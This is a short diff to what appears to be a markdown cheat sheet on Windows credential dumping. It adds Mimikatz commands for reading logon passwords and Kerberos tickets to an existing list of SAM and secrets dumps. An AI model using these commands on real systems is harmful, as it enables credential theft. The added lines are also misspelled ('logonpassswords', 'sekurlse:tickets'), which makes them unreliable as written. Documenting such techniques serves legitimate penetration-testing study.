@@ -148,6 +148,8 @@ dump with mimikatz
 # token::elevate 
 # lsadump::sam 
 # lsadump::secrets
+# sekurlsa::logonpassswords
+# sekurlse:tickets 
 ```
 ## Linux Credential Dumping:
 ```
